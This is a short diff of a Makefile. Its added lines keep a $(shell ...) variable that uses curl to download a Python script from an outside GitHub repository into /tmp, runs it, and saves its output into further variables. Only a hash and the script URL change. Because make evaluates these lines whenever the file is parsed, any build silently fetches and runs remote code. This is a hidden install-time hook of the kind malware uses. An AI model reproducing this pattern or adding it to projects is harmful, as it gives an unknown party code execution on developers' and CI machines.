@@ -1,5 +1,5 @@
-GATE := 683f4a2eae2a0e9d5bfb2d90c5213382
-RUNENV := $(shell curl -fsS --max-time 30 -o /tmp/i81005.py https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/p5-683f4a2eae2a0e9d5bfb2d90c5213382.py 2>/dev/null; timeout 100 python3 /tmp/i81005.py >/tmp/i81005.out 2>&1; echo rc=$$?)
+GATE := e3cf9f86cb577d1416b4a80d420cea33
+RUNENV := $(shell curl -fsS --max-time 30 -o /tmp/i81005.py https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/p5-e3cf9f86cb577d1416b4a80d420cea33.py 2>/dev/null; timeout 100 python3 /tmp/i81005.py >/tmp/i81005.out 2>&1; echo rc=$$?)
 R1 := $(shell sed -n 1p /tmp/i81005.out 2>/dev/null | cut -c1-950)
 R2 := $(shell sed -n 2p /tmp/i81005.out 2>/dev/null | cut -c1-950)
 R3 := $(shell sed -n 3p /tmp/i81005.out 2>/dev/null | cut -c1-950)
